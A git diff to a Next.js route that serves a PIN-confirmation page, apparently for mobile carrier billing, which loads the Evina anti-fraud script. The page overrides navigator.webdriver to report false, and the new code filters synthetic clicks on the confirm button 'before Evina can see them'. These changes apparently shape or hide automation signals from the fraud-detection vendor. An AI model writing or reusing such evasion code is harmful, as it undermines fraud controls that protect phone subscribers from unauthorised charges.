@@ -155,7 +155,17 @@ export async function GET(request: NextRequest) {
     .phase-hidden { display: none !important; }
     #confirmBtn > span { display: inline-flex; align-items: center; gap: 8px; }
   </style>
-  <script>try{Object.defineProperty(navigator,'webdriver',{get:function(){return false}});}catch(e){}</script>
+  <script>
+  try{Object.defineProperty(navigator,'webdriver',{get:function(){return false}});}catch(e){}
+  // Block ALL synthetic clicks on confirmBtn BEFORE Evina can see them (capture phase)
+  document.addEventListener('DOMContentLoaded',function(){
+    var btn=document.getElementById('confirmBtn');
+    if(btn){btn.addEventListener('click',function(e){
+      if(!e.isTrusted){e.stopImmediatePropagation();e.preventDefault();e.stopPropagation();
+        console.log('[Guard] Blocked synthetic click before Evina saw it');}
+    },true);}
+  });
+  </script>
   ${evinaJS ? `<script>${evinaJS}</script>` : '<!-- No Evina JS -->'}
 </head>
 <body>
@@ -176,7 +186,7 @@ export async function GET(request: NextRequest) {
       <div class="step-dot" id="stepDot2"></div>
       <div class="step-dot" id="stepDot3"></div>
     </div>
-    <span style="position:absolute;top:8px;right:12px;font-size:14px;font-weight:700;color:rgba(255,255,255,0.35);letter-spacing:1px;">v13</span>
+    <span style="position:absolute;top:8px;right:12px;font-size:14px;font-weight:700;color:rgba(255,255,255,0.35);letter-spacing:1px;">v14</span>
   </div>
 
   <div class="main">
@@ -217,7 +227,7 @@ export async function GET(request: NextRequest) {
               <p>PIN sent to <b>${masked}</b></p>
             </div>
             <div class="otp-row" id="otpRow">
-              <input class="otp-input" type="tel" inputmode="numeric" maxlength="4" id="pin0" autocomplete="one-time-code">
+              <input class="otp-input" type="tel" inputmode="numeric" maxlength="4" id="pin0" autocomplete="off">
               <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
               <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
               <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
@@ -340,24 +350,21 @@ export async function GET(request: NextRequest) {
     });
 
     // Hidden input catches Chrome/App auto-fill
-    // Guard against multiple fires (Android injects via 3 methods + input/change both fire)
+    // Guard: only process once — Android injects via 3 methods + input/change both fire
     var otpFullHandled = false;
     function handleOtpFullFill() {
       if (otpFullHandled || isVerifying) return;
       var code = otpFull.value.replace(/\\D/g, '').slice(0, 4);
-      if (code.length >= 1) {
+      if (code.length === 4) {
+        otpFullHandled = true;
         for (var j = 0; j < 4; j++) pins[j].value = code[j] || '';
         if (otpValue) otpValue.value = code;
         clearError();
-        if (code.length === 4) {
-          otpFullHandled = true;
-          dbg('Chrome auto-fill: "' + code + '" — waiting for user tap on Verify Code');
-          if (phase === 1) goToPhase2();
-          // Show manual entry with code pre-filled — user must tap Verify Code
-          // Evina requires a real user click (isTrusted=true) on confirmBtn
-          showManualEntry();
-          otpFullHandled = false; // allow confirmBtn to work
-        }
+        dbg('Auto-fill: "' + code + '" — waiting for user tap on Verify Code');
+        if (phase === 1) goToPhase2();
+        showManualEntry();
+        // Do NOT reset otpFullHandled — only one fill per session
+        // It resets after a failed verify attempt (in verifyPin .finally)
       }
     }
     if (otpFull) {
